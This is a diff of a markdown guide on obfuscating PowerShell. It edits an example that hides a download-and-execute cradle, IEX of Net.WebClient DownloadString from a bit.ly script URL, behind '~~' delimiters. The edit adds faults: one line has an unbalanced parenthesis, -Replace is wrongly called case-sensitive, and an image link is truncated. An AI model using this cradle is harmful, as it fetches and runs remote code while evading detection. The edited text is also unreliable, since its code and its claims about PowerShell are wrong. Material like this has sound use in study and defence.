@@ -452,11 +452,11 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 - String obfuscated<br />
 
-      $cmdWithDelim= "(New-Object Net.We~~bClient).Downlo~~adString('https://bi~~t.ly/L3g1t.ps1')"
-      IEX $cmdWithDelim.Replace("~~","") | IEX
+      $encoded= "(New-Object Net.We~~bClient).Downlo~~adString('https://bi~~t.ly/L3g1t.ps1')"
+      IEX ($encoded.Replace("~~","") | IEX
 
-      [ and -CReplace which is case-sensitive replace ]
-      IEX ($cmdWithDelim-Replace "~~","") | IEX
+      [ and -Replace which is case-sensitive replace ]
+      IEX ($encoded-Replace "~~","") | IEX
 
 
 ![powershell obfuscation](http://i.)
